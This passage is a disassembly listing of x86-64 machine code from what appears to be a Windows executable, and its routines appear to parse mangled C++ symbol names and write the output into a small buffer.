   14000178b:	83 fa 68             	cmp    $0x68,%edx
   14000178e:	74 48                	je     0x1400017d8
   140001790:	4c 89 d1             	mov    %r10,%rcx
   140001793:	e8 08 ff ff ff       	call   0x1400016a0
   140001798:	49 8b 42 18          	mov    0x18(%r10),%rax
   14000179c:	80 38 5f             	cmpb   $0x5f,(%rax)
   14000179f:	74 2f                	je     0x1400017d0
   1400017a1:	31 c0                	xor    %eax,%eax
   1400017a3:	48 83 c4 28          	add    $0x28,%rsp
   1400017a7:	c3                   	ret
   1400017a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400017af:	00 
   1400017b0:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400017b4:	80 38 00             	cmpb   $0x0,(%rax)
   1400017b7:	74 e8                	je     0x1400017a1
   1400017b9:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400017bd:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   1400017c1:	0f be 00             	movsbl (%rax),%eax
   1400017c4:	83 f8 68             	cmp    $0x68,%eax
   1400017c7:	74 0f                	je     0x1400017d8
   1400017c9:	83 f8 76             	cmp    $0x76,%eax
   1400017cc:	75 d3                	jne    0x1400017a1
   1400017ce:	eb c0                	jmp    0x140001790
   1400017d0:	48 83 c0 01          	add    $0x1,%rax
   1400017d4:	49 89 42 18          	mov    %rax,0x18(%r10)
   1400017d8:	4c 89 d1             	mov    %r10,%rcx
   1400017db:	e8 c0 fe ff ff       	call   0x1400016a0
   1400017e0:	49 8b 42 18          	mov    0x18(%r10),%rax
   1400017e4:	80 38 5f             	cmpb   $0x5f,(%rax)
   1400017e7:	75 b8                	jne    0x1400017a1
   1400017e9:	48 83 c0 01          	add    $0x1,%rax
   1400017ed:	49 89 42 18          	mov    %rax,0x18(%r10)
   1400017f1:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017f6:	48 83 c4 28          	add    $0x28,%rsp
   1400017fa:	c3                   	ret
   1400017fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001800:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001804:	44 0f b6 08          	movzbl (%rax),%r9d
   140001808:	41 80 f9 52          	cmp    $0x52,%r9b
   14000180c:	74 12                	je     0x140001820
   14000180e:	41 80 f9 4f          	cmp    $0x4f,%r9b
   140001812:	74 0c                	je     0x140001820
   140001814:	48 89 d0             	mov    %rdx,%rax
   140001817:	c3                   	ret
   140001818:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000181f:	00 
   140001820:	44 8b 51 48          	mov    0x48(%rcx),%r10d
   140001824:	41 bb 20 00 00 00    	mov    $0x20,%r11d
   14000182a:	45 8d 42 03          	lea    0x3(%r10),%r8d
   14000182e:	41 83 c2 02          	add    $0x2,%r10d
   140001832:	41 80 f9 52          	cmp    $0x52,%r9b
   140001836:	41 b9 1f 00 00 00    	mov    $0x1f,%r9d
   14000183c:	45 0f 44 c2          	cmove  %r10d,%r8d
   140001840:	45 0f 44 d9          	cmove  %r9d,%r11d
   140001844:	48 83 c0 01          	add    $0x1,%rax
   140001848:	45 31 c9             	xor    %r9d,%r9d
   14000184b:	48 89 41 18          	mov    %rax,0x18(%rcx)
   14000184f:	44 89 41 48          	mov    %r8d,0x48(%rcx)
   140001853:	49 89 d0             	mov    %rdx,%r8
   140001856:	44 89 da             	mov    %r11d,%edx
   140001859:	e9 e2 fc ff ff       	jmp    0x140001540
   14000185e:	66 90                	xchg   %ax,%ax
   140001860:	48 83 ec 28          	sub    $0x28,%rsp
   140001864:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001868:	80 38 5f             	cmpb   $0x5f,(%rax)
   14000186b:	75 17                	jne    0x140001884
   14000186d:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140001871:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140001875:	80 78 01 5f          	cmpb   $0x5f,0x1(%rax)
   140001879:	74 15                	je     0x140001890
   14000187b:	e8 20 fe ff ff       	call   0x1400016a0
   140001880:	85 c0                	test   %eax,%eax
   140001882:	78 44                	js     0x1400018c8
   140001884:	b8 01 00 00 00       	mov    $0x1,%eax
   140001889:	48 83 c4 28          	add    $0x28,%rsp
   14000188d:	c3                   	ret
   14000188e:	66 90                	xchg   %ax,%ax
   140001890:	48 83 c0 02          	add    $0x2,%rax
   140001894:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001899:	48 89 41 18          	mov    %rax,0x18(%rcx)
   14000189d:	e8 fe fd ff ff       	call   0x1400016a0
   1400018a2:	85 c0                	test   %eax,%eax
   1400018a4:	78 22                	js     0x1400018c8
   1400018a6:	83 f8 09             	cmp    $0x9,%eax
   1400018a9:	7e d9                	jle    0x140001884
   1400018ab:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400018b0:	48 8b 41 18          	mov    0x18(%rcx),%rax
   1400018b4:	80 38 5f             	cmpb   $0x5f,(%rax)
   1400018b7:	75 0f                	jne    0x1400018c8
   1400018b9:	48 83 c0 01          	add    $0x1,%rax
   1400018bd:	48 89 41 18          	mov    %rax,0x18(%rcx)
   1400018c1:	eb c1                	jmp    0x140001884
   1400018c3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400018c8:	31 c0                	xor    %eax,%eax
   1400018ca:	48 83 c4 28          	add    $0x28,%rsp
   1400018ce:	c3                   	ret
   1400018cf:	90                   	nop
   1400018d0:	53                   	push   %rbx
   1400018d1:	48 83 ec 20          	sub    $0x20,%rsp
   1400018d5:	48 89 cb             	mov    %rcx,%rbx
   1400018d8:	48 89 d0             	mov    %rdx,%rax
   1400018db:	48 85 d2             	test   %rdx,%rdx
   1400018de:	74 57                	je     0x140001937
   1400018e0:	8b 50 08             	mov    0x8(%rax),%edx
   1400018e3:	83 fa 01             	cmp    $0x1,%edx
   1400018e6:	7f 4f                	jg     0x140001937
   1400018e8:	81 bb 34 01 00 00 00 	cmpl   $0x400,0x134(%rbx)
   1400018ef:	04 00 00 
   1400018f2:	7f 43                	jg     0x140001937
   1400018f4:	83 c2 01             	add    $0x1,%edx
   1400018f7:	89 50 08             	mov    %edx,0x8(%rax)
   1400018fa:	8b 10                	mov    (%rax),%edx
   1400018fc:	83 fa 34             	cmp    $0x34,%edx
   1400018ff:	77 7f                	ja     0x140001980
   140001901:	83 fa 08             	cmp    $0x8,%edx
   140001904:	77 3a                	ja     0x140001940
   140001906:	83 fa 07             	cmp    $0x7,%edx
   140001909:	74 65                	je     0x140001970
   14000190b:	83 fa 08             	cmp    $0x8,%edx
   14000190e:	74 60                	je     0x140001970
   140001910:	83 fa 03             	cmp    $0x3,%edx
   140001913:	0f 86 07 01 00 00    	jbe    0x140001a20
   140001919:	83 fa 04             	cmp    $0x4,%edx
   14000191c:	75 19                	jne    0x140001937
   14000191e:	83 83 6c 01 00 00 01 	addl   $0x1,0x16c(%rbx)
   140001925:	8b 93 34 01 00 00    	mov    0x134(%rbx),%edx
   14000192b:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   140001931:	0f 8e 89 00 00 00    	jle    0x1400019c0
   140001937:	48 83 c4 20          	add    $0x20,%rsp
   14000193b:	5b                   	pop    %rbx
   14000193c:	c3                   	ret
   14000193d:	0f 1f 00             	nopl   (%rax)
   140001940:	8d 4a f7             	lea    -0x9(%rdx),%ecx
   140001943:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001949:	49 d3 e0             	shl    %cl,%r8
   14000194c:	4c 89 c1             	mov    %r8,%rcx
   14000194f:	49 b8 ff 7f ff 67 ef 	movabs $0x3ef67ff7fff,%r8
   140001956:	03 00 00 
   140001959:	4c 85 c1             	test   %r8,%rcx
   14000195c:	75 c7                	jne    0x140001925
   14000195e:	f7 c1 00 00 00 18    	test   $0x18000000,%ecx
   140001964:	0f 85 96 00 00 00    	jne    0x140001a00
   14000196a:	83 fa 34             	cmp    $0x34,%edx
   14000196d:	75 c8                	jne    0x140001937
   14000196f:	90                   	nop
   140001970:	48 8b 40 18          	mov    0x18(%rax),%rax
   140001974:	48 85 c0             	test   %rax,%rax
   140001977:	0f 85 63 ff ff ff    	jne    0x1400018e0
   14000197d:	eb b8                	jmp    0x140001937
   14000197f:	90                   	nop
   140001980:	8d 4a cb             	lea    -0x35(%rdx),%ecx
   140001983:	83 f9 29             	cmp    $0x29,%ecx
   140001986:	77 af                	ja     0x140001937
   140001988:	ba 01 00 00 00       	mov    $0x1,%edx
   14000198d:	48 d3 e2             	shl    %cl,%rdx
   140001990:	48 b9 ff 3f c1 6f 00 	movabs $0x2006fc13fff,%rcx
   140001997:	02 00 00 
   14000199a:	48 85 ca             	test   %rcx,%rdx
   14000199d:	75 86                	jne    0x140001925
   14000199f:	48 b9 00 00 06 10 04 	movabs $0x410060000,%rcx
   1400019a6:	00 00 00 
   1400019a9:	48 85 ca             	test   %rcx,%rdx
   1400019ac:	75 0c                	jne    0x1400019ba
   1400019ae:	f7 c2 00 00 18 00    	test   $0x180000,%edx
   1400019b4:	0f 84 7d ff ff ff    	je     0x140001937
   1400019ba:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400019be:	eb b4                	jmp    0x140001974
   1400019c0:	83 c2 01             	add    $0x1,%edx
   1400019c3:	48 89 d9             	mov    %rbx,%rcx
   1400019c6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400019cb:	89 93 34 01 00 00    	mov    %edx,0x134(%rbx)
   1400019d1:	48 8b 50 10          	mov    0x10(%rax),%rdx
   1400019d5:	e8 f6 fe ff ff       	call   0x1400018d0
   1400019da:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400019df:	48 89 d9             	mov    %rbx,%rcx
   1400019e2:	48 8b 50 18          	mov    0x18(%rax),%rdx
   1400019e6:	e8 e5 fe ff ff       	call   0x1400018d0
   1400019eb:	83 ab 34 01 00 00 01 	subl   $0x1,0x134(%rbx)
   1400019f2:	48 83 c4 20          	add    $0x20,%rsp
   1400019f6:	5b                   	pop    %rbx
   1400019f7:	c3                   	ret
   1400019f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400019ff:	00 
   140001a00:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140001a04:	83 3a 05             	cmpl   $0x5,(%rdx)
   140001a07:	0f 85 18 ff ff ff    	jne    0x140001925
   140001a0d:	83 83 5c 01 00 00 01 	addl   $0x1,0x15c(%rbx)
   140001a14:	e9 0c ff ff ff       	jmp    0x140001925
   140001a19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001a20:	85 d2                	test   %edx,%edx
   140001a22:	0f 85 fd fe ff ff    	jne    0x140001925
   140001a28:	e9 0a ff ff ff       	jmp    0x140001937
   140001a2d:	0f 1f 00             	nopl   (%rax)
   140001a30:	31 c0                	xor    %eax,%eax
   140001a32:	48 85 c9             	test   %rcx,%rcx
   140001a35:	75 1c                	jne    0x140001a53
   140001a37:	eb 1f                	jmp    0x140001a58
   140001a39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001a40:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
   140001a45:	74 11                	je     0x140001a58
   140001a47:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001a4b:	83 c0 01             	add    $0x1,%eax
   140001a4e:	48 85 c9             	test   %rcx,%rcx
   140001a51:	74 05                	je     0x140001a58
   140001a53:	83 39 30             	cmpl   $0x30,(%rcx)
   140001a56:	74 e8                	je     0x140001a40
   140001a58:	c3                   	ret
   140001a59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001a60:	48 85 c9             	test   %rcx,%rcx
   140001a63:	75 1b                	jne    0x140001a80
   140001a65:	eb 1e                	jmp    0x140001a85
   140001a67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001a6e:	00 00 
   140001a70:	85 d2                	test   %edx,%edx
   140001a72:	74 1c                	je     0x140001a90
   140001a74:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001a78:	83 ea 01             	sub    $0x1,%edx
   140001a7b:	48 85 c9             	test   %rcx,%rcx
   140001a7e:	74 05                	je     0x140001a85
   140001a80:	83 39 30             	cmpl   $0x30,(%rcx)
   140001a83:	74 eb                	je     0x140001a70
   140001a85:	31 c0                	xor    %eax,%eax
   140001a87:	c3                   	ret
   140001a88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001a8f:	00 
   140001a90:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140001a94:	c3                   	ret
   140001a95:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001a9c:	00 00 00 00 
   140001aa0:	56                   	push   %rsi
   140001aa1:	53                   	push   %rbx
   140001aa2:	48 83 ec 38          	sub    $0x38,%rsp
   140001aa6:	49 8b 40 08          	mov    0x8(%r8),%rax
   140001aaa:	48 89 d6             	mov    %rdx,%rsi
   140001aad:	48 8d 44 02 01       	lea    0x1(%rdx,%rax,1),%rax
   140001ab2:	49 8b 50 10          	mov    0x10(%r8),%rdx
   140001ab6:	49 89 c9             	mov    %rcx,%r9
   140001ab9:	4c 89 c3             	mov    %r8,%rbx
   140001abc:	48 39 c2             	cmp    %rax,%rdx
   140001abf:	72 37                	jb     0x140001af8
   140001ac1:	8b 43 18             	mov    0x18(%rbx),%eax
   140001ac4:	85 c0                	test   %eax,%eax
   140001ac6:	75 23                	jne    0x140001aeb
   140001ac8:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001acc:	49 89 f0             	mov    %rsi,%r8
   140001acf:	48 03 0b             	add    (%rbx),%rcx
   140001ad2:	4c 89 ca             	mov    %r9,%rdx
   140001ad5:	e8 96 d9 00 00       	call   0x14000f470
   140001ada:	48 8b 03             	mov    (%rbx),%rax
   140001add:	48 01 f0             	add    %rsi,%rax
   140001ae0:	48 03 43 08          	add    0x8(%rbx),%rax
   140001ae4:	c6 00 00             	movb   $0x0,(%rax)
   140001ae7:	48 01 73 08          	add    %rsi,0x8(%rbx)
   140001aeb:	48 83 c4 38          	add    $0x38,%rsp
   140001aef:	5b                   	pop    %rbx
   140001af0:	5e                   	pop    %rsi
   140001af1:	c3                   	ret
   140001af2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001af8:	41 8b 48 18          	mov    0x18(%r8),%ecx
   140001afc:	85 c9                	test   %ecx,%ecx
   140001afe:	75 eb                	jne    0x140001aeb
   140001b00:	48 85 d2             	test   %rdx,%rdx
   140001b03:	74 43                	je     0x140001b48
   140001b05:	0f 1f 00             	nopl   (%rax)
   140001b08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b0f:	00 
   140001b10:	48 01 d2             	add    %rdx,%rdx
   140001b13:	48 39 c2             	cmp    %rax,%rdx
   140001b16:	72 f8                	jb     0x140001b10
   140001b18:	48 8b 0b             	mov    (%rbx),%rcx
   140001b1b:	4c 89 4c 24 50       	mov    %r9,0x50(%rsp)
   140001b20:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001b25:	e8 96 d9 00 00       	call   0x14000f4c0
   140001b2a:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140001b2f:	4c 8b 4c 24 50       	mov    0x50(%rsp),%r9
   140001b34:	48 85 c0             	test   %rax,%rax
   140001b37:	74 1c                	je     0x140001b55
   140001b39:	48 89 03             	mov    %rax,(%rbx)
   140001b3c:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140001b40:	e9 7c ff ff ff       	jmp    0x140001ac1
   140001b45:	0f 1f 00             	nopl   (%rax)
   140001b48:	ba 02 00 00 00       	mov    $0x2,%edx
   140001b4d:	48 83 f8 02          	cmp    $0x2,%rax
   140001b51:	77 bd                	ja     0x140001b10
   140001b53:	eb c3                	jmp    0x140001b18
   140001b55:	48 8b 0b             	mov    (%rbx),%rcx
   140001b58:	e8 53 d9 00 00       	call   0x14000f4b0
   140001b5d:	31 d2                	xor    %edx,%edx
   140001b5f:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140001b63:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%rbx)
   140001b6a:	48 89 13             	mov    %rdx,(%rbx)
   140001b6d:	0f 11 43 08          	movups %xmm0,0x8(%rbx)
   140001b71:	e9 75 ff ff ff       	jmp    0x140001aeb
   140001b76:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001b7d:	00 00 00 
   140001b80:	0f b6 11             	movzbl (%rcx),%edx
   140001b83:	8d 42 b5             	lea    -0x4b(%rdx),%eax
   140001b86:	3c 27                	cmp    $0x27,%al
   140001b88:	76 0e                	jbe    0x140001b98
   140001b8a:	31 c0                	xor    %eax,%eax
   140001b8c:	80 fa 44             	cmp    $0x44,%dl
   140001b8f:	74 1f                	je     0x140001bb0
   140001b91:	c3                   	ret
   140001b92:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001b98:	48 ba fe f7 ff ff 7f 	movabs $0xffffff7ffffff7fe,%rdx
   140001b9f:	ff ff ff 
   140001ba2:	48 0f a3 c2          	bt     %rax,%rdx
   140001ba6:	0f 93 c0             	setae  %al
   140001ba9:	0f b6 c0             	movzbl %al,%eax
   140001bac:	c3                   	ret
   140001bad:	0f 1f 00             	nopl   (%rax)
   140001bb0:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   140001bb4:	31 c0                	xor    %eax,%eax
   140001bb6:	83 ea 4f             	sub    $0x4f,%edx
   140001bb9:	80 fa 29             	cmp    $0x29,%dl
   140001bbc:	77 d3                	ja     0x140001b91
   140001bbe:	48 b8 01 00 00 00 01 	movabs $0x30100000001,%rax
   140001bc5:	03 00 00 
   140001bc8:	48 0f a3 d0          	bt     %rdx,%rax
   140001bcc:	0f 92 c0             	setb   %al
   140001bcf:	0f b6 c0             	movzbl %al,%eax
   140001bd2:	c3                   	ret
   140001bd3:	66 90                	xchg   %ax,%ax
   140001bd5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001bdc:	00 00 00 00 
   140001be0:	48 83 ec 38          	sub    $0x38,%rsp
   140001be4:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140001beb:	41 89 d1             	mov    %edx,%r9d
   140001bee:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   140001bf4:	74 22                	je     0x140001c18
   140001bf6:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140001bfa:	48 89 91 00 01 00 00 	mov    %rdx,0x100(%rcx)
   140001c01:	44 88 0c 01          	mov    %r9b,(%rcx,%rax,1)
   140001c05:	44 88 89 08 01 00 00 	mov    %r9b,0x108(%rcx)
   140001c0c:	48 83 c4 38          	add    $0x38,%rsp
   140001c10:	c3                   	ret
   140001c11:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001c18:	89 54 24 2c          	mov    %edx,0x2c(%rsp)
   140001c1c:	4c 8b 81 18 01 00 00 	mov    0x118(%rcx),%r8
   140001c23:	ba ff 00 00 00       	mov    $0xff,%edx
   140001c28:	c6 81 ff 00 00 00 00 	movb   $0x0,0xff(%rcx)
   140001c2f:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001c34:	ff 91 10 01 00 00    	call   *0x110(%rcx)
   140001c3a:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140001c3f:	44 8b 4c 24 2c       	mov    0x2c(%rsp),%r9d
   140001c44:	31 c0                	xor    %eax,%eax
   140001c46:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c4b:	83 81 40 01 00 00 01 	addl   $0x1,0x140(%rcx)
   140001c52:	eb a6                	jmp    0x140001bfa
   140001c54:	90                   	nop
   140001c55:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001c5c:	00 00 00 00 
   140001c60:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140001c67:	48 85 c0             	test   %rax,%rax
   140001c6a:	74 3c                	je     0x140001ca8
   140001c6c:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001c70:	8b 52 10             	mov    0x10(%rdx),%edx
   140001c73:	48 8b 40 18          	mov    0x18(%rax),%rax
   140001c77:	85 d2                	test   %edx,%edx
   140001c79:	78 24                	js     0x140001c9f
   140001c7b:	48 85 c0             	test   %rax,%rax
   140001c7e:	75 18                	jne    0x140001c98
   140001c80:	eb 1b                	jmp    0x140001c9d
   140001c82:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001c88:	85 d2                	test   %edx,%edx
   140001c8a:	74 14                	je     0x140001ca0
   140001c8c:	48 8b 40 18          	mov    0x18(%rax),%rax
   140001c90:	83 ea 01             	sub    $0x1,%edx
   140001c93:	48 85 c0             	test   %rax,%rax
   140001c96:	74 05                	je     0x140001c9d
   140001c98:	83 38 30             	cmpl   $0x30,(%rax)
   140001c9b:	74 eb                	je     0x140001c88
   140001c9d:	31 c0                	xor    %eax,%eax
   140001c9f:	c3                   	ret
   140001ca0:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001ca4:	c3                   	ret
   140001ca5:	0f 1f 00             	nopl   (%rax)
   140001ca8:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   140001caf:	00 00 00 
   140001cb2:	31 c0                	xor    %eax,%eax
   140001cb4:	eb e9                	jmp    0x140001c9f
   140001cb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140001cbd:	00 00 00 
   140001cc0:	55                   	push   %rbp
   140001cc1:	57                   	push   %rdi
   140001cc2:	56                   	push   %rsi
   140001cc3:	53                   	push   %rbx
   140001cc4:	48 83 ec 28          	sub    $0x28,%rsp
   140001cc8:	48 89 cb             	mov    %rcx,%rbx
   140001ccb:	48 89 d1             	mov    %rdx,%rcx
   140001cce:	48 89 d6             	mov    %rdx,%rsi
   140001cd1:	e8 aa d6 00 00       	call   0x14000f380
   140001cd6:	48 85 c0             	test   %rax,%rax
   140001cd9:	0f 84 a1 00 00 00    	je     0x140001d80
   140001cdf:	48 8b 93 00 01 00 00 	mov    0x100(%rbx),%rdx
   140001ce6:	48 8d 2c 06          	lea    (%rsi,%rax,1),%rbp
   140001cea:	eb 36                	jmp    0x140001d22
   140001cec:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001cf3:	00 00 
   140001cf5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001cfc:	00 00 00 00 
   140001d00:	48 89 d1             	mov    %rdx,%rcx
   140001d03:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140001d07:	48 83 c6 01          	add    $0x1,%rsi
   140001d0b:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   140001d12:	40 88 3c 0b          	mov    %dil,(%rbx,%rcx,1)
   140001d16:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   140001d1d:	48 39 ee             	cmp    %rbp,%rsi
   140001d20:	74 5e                	je     0x140001d80
   140001d22:	0f b6 3e             	movzbl (%rsi),%edi
   140001d25:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   140001d2c:	75 d2                	jne    0x140001d00
   140001d2e:	48 83 c6 01          	add    $0x1,%rsi
   140001d32:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%rbx)
   140001d39:	ba ff 00 00 00       	mov    $0xff,%edx
   140001d3e:	48 89 d9             	mov    %rbx,%rcx
   140001d41:	4c 8b 83 18 01 00 00 	mov    0x118(%rbx),%r8
   140001d48:	ff 93 10 01 00 00    	call   *0x110(%rbx)
   140001d4e:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   140001d55:	48 c7 83 00 01 00 00 	movq   $0x1,0x100(%rbx)
   140001d5c:	01 00 00 00 
   140001d60:	40 88 3b             	mov    %dil,(%rbx)
   140001d63:	40 88 bb 08 01 00 00 	mov    %dil,0x108(%rbx)
   140001d6a:	48 39 f5             	cmp    %rsi,%rbp
   140001d6d:	74 11                	je     0x140001d80
   140001d6f:	0f b6 3e             	movzbl (%rsi),%edi
   140001d72:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001d77:	eb 8a                	jmp    0x140001d03
   140001d79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d80:	48 83 c4 28          	add    $0x28,%rsp
   140001d84:	5b                   	pop    %rbx
   140001d85:	5e                   	pop    %rsi
   140001d86:	5f                   	pop    %rdi
   140001d87:	5d                   	pop    %rbp
   140001d88:	c3                   	ret
   140001d89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d90:	48 83 ec 28          	sub    $0x28,%rsp
   140001d94:	49 89 d0             	mov    %rdx,%r8
   140001d97:	48 85 d2             	test   %rdx,%rdx
   140001d9a:	74 44                	je     0x140001de0
   140001d9c:	41 8b 00             	mov    (%r8),%eax
   140001d9f:	83 f8 18             	cmp    $0x18,%eax
   140001da2:	77 14                	ja     0x140001db8
   140001da4:	48 8d 15 8d 35 02 00 	lea    0x2358d(%rip),%rdx        # 0x140025338
   140001dab:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140001daf:	48 01 d0             	add    %rdx,%rax
   140001db2:	ff e0                	jmp    *%rax
   140001db4:	0f 1f 40 00          	nopl   0x0(%rax)
   140001db8:	83 e8 28             	sub    $0x28,%eax
   140001dbb:	83 f8 37             	cmp    $0x37,%eax
   140001dbe:	77 30                	ja     0x140001df0
   140001dc0:	48 ba 01 08 00 18 67 	movabs $0x80006718000801,%rdx
   140001dc7:	00 80 00 
   140001dca:	48 0f a3 c2          	bt     %rax,%rdx
   140001dce:	72 10                	jb     0x140001de0
   140001dd0:	83 f8 0c             	cmp    $0xc,%eax
   140001dd3:	75 1b                	jne    0x140001df0
   140001dd5:	4d 8b 40 18          	mov    0x18(%r8),%r8
   140001dd9:	4d 85 c0             	test   %r8,%r8
   140001ddc:	75 be                	jne    0x140001d9c
   140001dde:	66 90                	xchg   %ax,%ax
   140001de0:	31 c0                	xor    %eax,%eax
   140001de2:	48 83 c4 28          	add    $0x28,%rsp
   140001de6:	c3                   	ret
   140001de7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001dee:	00 00 
   140001df0:	49 8b 50 10          	mov    0x10(%r8),%rdx
   140001df4:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140001df9:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001dfe:	e8 8d ff ff ff       	call   0x140001d90
   140001e03:	48 85 c0             	test   %rax,%rax
   140001e06:	75 da                	jne    0x140001de2
   140001e08:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140001e0d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001e12:	4d 8b 40 18          	mov    0x18(%r8),%r8
   140001e16:	eb c1                	jmp    0x140001dd9
   140001e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001e1f:	00 
   140001e20:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140001e27:	48 85 c0             	test   %rax,%rax
   140001e2a:	74 54                	je     0x140001e80
   140001e2c:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001e30:	41 8b 50 10          	mov    0x10(%r8),%edx
   140001e34:	48 8b 40 18          	mov    0x18(%rax),%rax
   140001e38:	85 d2                	test   %edx,%edx
   140001e3a:	78 28                	js     0x140001e64
   140001e3c:	48 85 c0             	test   %rax,%rax
   140001e3f:	75 17                	jne    0x140001e58
   140001e41:	eb 9d                	jmp    0x140001de0
   140001e43:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e48:	85 d2                	test   %edx,%edx
   140001e4a:	74 14                	je     0x140001e60
   140001e4c:	48 8b 40 18          	mov    0x18(%rax),%rax
   140001e50:	83 ea 01             	sub    $0x1,%edx
   140001e53:	48 85 c0             	test   %rax,%rax
   140001e56:	74 88                	je     0x140001de0
   140001e58:	83 38 30             	cmpl   $0x30,(%rax)
   140001e5b:	74 eb                	je     0x140001e48
   140001e5d:	eb 81                	jmp    0x140001de0
   140001e5f:	90                   	nop
   140001e60:	48 8b 40 10          	mov    0x10(%rax),%rax
   140001e64:	48 85 c0             	test   %rax,%rax
   140001e67:	0f 84 73 ff ff ff    	je     0x140001de0
   140001e6d:	83 38 30             	cmpl   $0x30,(%rax)
   140001e70:	0f 85 6a ff ff ff    	jne    0x140001de0
   140001e76:	48 83 c4 28          	add    $0x28,%rsp
   140001e7a:	c3                   	ret
   140001e7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e80:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   140001e87:	00 00 00 
   140001e8a:	e9 51 ff ff ff       	jmp    0x140001de0
   140001e8f:	90                   	nop
   140001e90:	48 83 ec 28          	sub    $0x28,%rsp
   140001e94:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140001e98:	49 89 ca             	mov    %rcx,%r10
   140001e9b:	80 38 54             	cmpb   $0x54,(%rax)
   140001e9e:	75 68                	jne    0x140001f08
   140001ea0:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140001ea4:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140001ea8:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   140001eac:	3c 5f                	cmp    $0x5f,%al
   140001eae:	74 60                	je     0x140001f10
   140001eb0:	3c 6e                	cmp    $0x6e,%al
   140001eb2:	74 54                	je     0x140001f08
   140001eb4:	e8 e7 f7 ff ff       	call   0x1400016a0
   140001eb9:	83 c0 01             	add    $0x1,%eax
   140001ebc:	89 c1                	mov    %eax,%ecx
   140001ebe:	78 48                	js     0x140001f08
